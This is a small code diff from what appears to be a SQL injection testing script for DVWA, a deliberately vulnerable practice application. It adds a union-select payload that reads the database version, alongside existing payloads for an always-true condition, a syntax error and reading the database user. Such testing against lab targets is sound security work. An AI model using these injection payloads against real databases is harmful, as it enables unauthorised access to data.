@@ -17,6 +17,7 @@ DVWA_VULNERABILITY_ENDPOINTS = ['vulnerabilities/sqli/']
 SQL_ALWAYS_TRUE_PAYLOAD = """%' or '0'='0"""
 SQL_SYNTAX_ERROR_PAYLOAD = "';;;'"
 SQL_GET_DB_USER_PAYLOAD = """%' or 0=0 union select null, user() #"""
+SQL_GET_DB_VERSION_PAYLOAD = """%' or 0=0 union select null, version() #"""
 SQL_VULNERABILITY_CHECK_TEXT = 'You have an error in your SQL syntax'
 
 # Cookies
